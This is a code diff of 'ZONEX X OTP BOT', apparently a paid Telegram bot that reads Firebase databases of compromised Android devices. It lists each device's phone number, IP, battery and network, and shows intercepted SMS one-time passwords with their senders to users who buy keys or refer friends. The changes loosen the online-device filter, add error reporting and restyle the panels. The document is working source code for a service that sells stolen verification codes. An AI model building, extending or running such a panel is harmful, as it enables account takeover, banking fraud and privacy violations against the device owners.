@@ -2,7 +2,7 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v4.6              ║
+║        ZONEX X OTP BOT v5.1              ║
 ║  High Level UI · Channel Gate · Admin    ║
 ╚══════════════════════════════════════════╝
 """
@@ -451,7 +451,10 @@ async def fetch_otps(url: str, key: str, dev_id: str):
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
     clients = await fb_get(url, "clients", key)
-    if not isinstance(clients, dict): return
+    
+    if not isinstance(clients, dict): 
+        fb_conn_status[label] = "error"
+        return
 
     valid = []
     for dev_id, info in clients.items():
@@ -483,10 +486,9 @@ async def refresh_firebase(cfg: dict):
 
     devs, otps_map = {}, {}
     for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
-        phone_ok = _has_valid_phone({"phone": phone})
         fb_status = bool(info.get("status") or info.get("isOnline") or
                          info.get("is_online") or info.get("online"))
-        is_online  = fb_status and phone_ok
+        is_online  = fb_status  
 
         ts_raw = (info.get("lastSeen") or info.get("last_seen") or
                   info.get("lastOnline") or "")
@@ -510,8 +512,11 @@ async def refresh_firebase(cfg: dict):
 async def refresh_clients_only(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
+    
     if not isinstance(clients, dict):
+        fb_conn_status[label] = "error"
         return
+        
     devs = {}
     for dev_id, info in clients.items():
         if not isinstance(info, dict):
@@ -530,10 +535,10 @@ async def refresh_clients_only(cfg: dict):
             info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
             info.get("PhoneNumber"), sim_phone,
         )
-        phone_ok  = _has_valid_phone({"phone": phone})
         fb_status = bool(info.get("status") or info.get("isOnline") or
                          info.get("is_online") or info.get("online"))
-        is_online = fb_status and phone_ok
+        is_online = fb_status  
+        
         ts_raw    = (info.get("lastSeen") or info.get("last_seen") or
                      info.get("lastOnline") or "")
         devs[dev_id] = {
@@ -607,7 +612,7 @@ def _has_valid_phone(info: dict) -> bool:
 def count_online() -> int:
     return sum(1 for dm in device_cache.values()
                for d in dm.values()
-               if d.get("online") and _has_valid_phone(d))
+               if d.get("online"))
 
 def count_total() -> int:
     return sum(len(dm) for dm in device_cache.values())
@@ -619,7 +624,7 @@ def all_online() -> list:
     return [(lb, did, info)
             for lb, dm in device_cache.items()
             for did, info in dm.items()
-            if info.get("online") and _has_valid_phone(info)]
+            if info.get("online")]
 
 def resolve_label(esc: str) -> str:
     for cfg in data["firebase_configs"]:
@@ -632,23 +637,22 @@ def txt_welcome_panel(name: str, uid: int) -> str:
     tl  = time_left_str(uid)
     on  = count_online()
     otp = count_otps()
-    dbs = len(data['firebase_configs'])
     
     return (
-        f"┌───────────────────────┐\n"
-        f"│   🤖 <b>ZONEX X OTP BOT</b>   │\n"
-        f"└───────────────────────┘\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
         f"👋 Welcome, <b>{name}</b>!\n\n"
-        f"┌───────────────────────┐\n"
-        f"│ ⏱ <b>ACCESS</b>  ›  {tl}\n"
-        f"│ 🟢 <b>STATUS</b>  ›  ✅ Active\n"
-        f"└───────────────────────┘\n\n"
-        f"┌─────── 🛰️ <b>LIVE STATS</b> ───────┐\n"
-        f"│ 🟢 Online     › <b>{on}</b>\n"
-        f"│ 🔑 Total OTPs › <b>{otp}</b>\n"
-        f"└──────────────────────────────┘\n\n"
-        f"🕐 Last Sync  › <code>{last_refresh}</code>\n"
-        f"🔄 Auto Refresh › <b>{AUTO_REFRESH}s</b>"
+        f"╭──────────────────────╮\n"
+        f"⏱️ <b>𝐀𝐂𝐂𝐄𝐒𝐒</b>  ›  {tl}\n"
+        f"🟢 <b>𝐒𝐓𝐀𝐓𝐔𝐒</b>   ›  ✅ Active\n"
+        f"╰──────────────────────╯\n\n"
+        f"╭━━━ 📡 <b>𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒</b> ━━━╮\n"
+        f"🟢 Online      › {on}\n"
+        f"🔑 Total OTPs  › {otp}\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"🕐 Last Sync  › {last_refresh}\n"
+        f"🔄 Auto Refresh › {AUTO_REFRESH}s"
     )
 
 def _val(v: str) -> bool:
@@ -665,29 +669,29 @@ def txt_device_card(label: str, dev_id: str) -> str:
     last_seen = str(info.get('last_seen','—'))
 
     header = (
-        f"┌───────────────────────┐\n"
-        f"│   📱 <b>DEVICE INFO</b>      │\n"
-        f"└───────────────────────┘\n\n"
-        f"┌───────────────────────┐\n"
-        f"│ 📞 Number   › <code>{phone}</code>\n"
-        f"│ 🔋 Battery  › <code>{battery}</code>\n"
-        f"│ 🤖 Android  › <code>{android}</code>\n"
-        f"│ 📡 Network  › <code>{network}</code>\n"
-        f"│ 🌐 IP       › <code>{ip}</code>\n"
-        f"│ 🕐 Last Seen› <code>{last_seen}</code>\n"
-        f"│ 🔥 Database › <code>{label}</code>\n"
-        f"└───────────────────────┘\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"📱 <b>𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"╭──────────────────────╮\n"
+        f"📞 Number   › <code>{phone}</code>\n"
+        f"🔋 Battery  › {battery}\n"
+        f"🤖 Android  › {android}\n"
+        f"📡 Network  › {network}\n"
+        f"🌐 IP       › <code>{ip}</code>\n"
+        f"🕐 Last Seen › {last_seen}\n"
+        f"🔥 Database › {label}\n"
+        f"╰──────────────────────╯\n\n"
     )
 
     lines = [header]
     if otps:
         e = otps[0]
         lines.append(
-            f"┌─────── 🔑 <b>LATEST OTP</b> ───────┐\n"
-            f"│ ⚡ <b>CODE</b>   › <code>{e['otp']}</code>\n"
-            f"│ 📤 <b>Sender</b> › <code>{e['sender']}</code>\n"
-            f"│ 🕐 <b>Time</b>   › <code>{e['time']}</code>\n"
-            f"└─────────────────────────────┘"
+            f"╭━━━ 🔑 <b>𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏</b> ━━━╮\n"
+            f"⚡ CODE   › <code>{e['otp']}</code>\n"
+            f"📤 Sender › {e['sender']}\n"
+            f"🕐 Time   › {e['time']}\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
         )
     else:
         lines.append("\n❌ <i>Koi recent OTP nahi mila</i>")
@@ -775,16 +779,23 @@ def txt_stats() -> str:
 def txt_expired(name: str) -> str:
     rh = get_referral_hours()
     return (
-        f"⏰ <b>Access Khatam!</b>\n"
-        f"{'━'*28}\n\n"
-        f"Arre <b>{name}</b>, tumhara time khatam ho gaya! 😔\n\n"
-        f"<b>Wapas aane ke 2 tarike:</b>\n\n"
-        f"💰 <b>Buy Key</b>\n"
-        f"   Plan kharido, turant access milega\n\n"
-        f"👥 <b>Refer & Earn</b>\n"
-        f"   Ek dost = FREE <b>+{rh:.0f}h</b> access! Bilkul free!\n"
-        f"{'─'*28}\n"
-        f"<i>Refer link ke liye 👇 button dabao</i>"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ <b>𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"😔 Arre <b>{name}</b>,\n"
+        f"   tumhara time khatam ho gaya!\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💎 <b>𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐎𝐏𝐓𝐈𝐎𝐍</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"💰 <b>𝐁𝐔𝐘 𝐊𝐄𝐘</b>\n"
+        f"   Plan kharido, turant access milega.\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👥 <b>𝐑𝐄𝐅𝐄𝐑 & 𝐄𝐀𝐑𝐍</b>\n"
+        f"   Ek dost = FREE +{int(rh)} hour access! 🎁\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔗 Refer link ke liye 👇\n"
+        f"   neeche button dabao!\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━"
     )
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
@@ -815,7 +826,7 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
             ph   = _normalize_phone(info.get("phone","—"))
             ph_short = ph[-10:] if ph != "—" else "—"
             esc  = lb.replace(":","_")
-            row.append(InlineKeyboardButton(f"🟢 {ph_short}",  # <-- Removed [x🔑]
+            row.append(InlineKeyboardButton(f"🟢 {ph_short}",
                                             callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
@@ -892,7 +903,7 @@ def kb_admin() -> InlineKeyboardMarkup:
 def _fb_online_count(label: str) -> int:
     return sum(
         1 for d in device_cache.get(label, {}).values()
-        if d.get("online") and _has_valid_phone(d)
+        if d.get("online")
     )
 
 def _fb_total_count(label: str) -> int:
@@ -1116,7 +1127,7 @@ async def handle_key_entry(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(
         f"✅ <b>Key Verified!</b> Panel khul gaya 🎉\n"
-        f"{'━'*28}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         + txt_welcome_panel(name, uid),
         reply_markup=kb_main(uid),
         parse_mode="HTML"
@@ -1300,12 +1311,12 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         
         # High Level ERA Style Online Panel
         await q.edit_message_text(
-            f"┌───────────────────────┐\n"
-            f"│   📱 <b>ONLINE DEVICES</b>   │\n"
-            f"└───────────────────────┘\n\n"
-            f"🟢 <b>ACTIVE</b> › <b>{len(devs)}</b> DEVICES\n"
-            f"🕐 <b>SYNC</b> › <code>{now_dt().strftime('%H:%M:%S')}</code>\n"
-            f"{'─'*30}",
+            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            f"   📱 <b>𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"🟢 <b>𝐀𝐂𝐓𝐈𝐕𝐄</b> › <b>{len(devs)}</b> 𝐃𝐄𝐕𝐈𝐂𝐄𝐒\n"
+            f"🕐 <b>𝐒𝐘𝐍𝐂</b> › {now_dt().strftime('%H:%M:%S')}\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━",
             reply_markup=kb_online(devs, pg), parse_mode="HTML")
 
     elif cb.startswith("dev:"):
@@ -2551,7 +2562,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v4.6 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.1 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
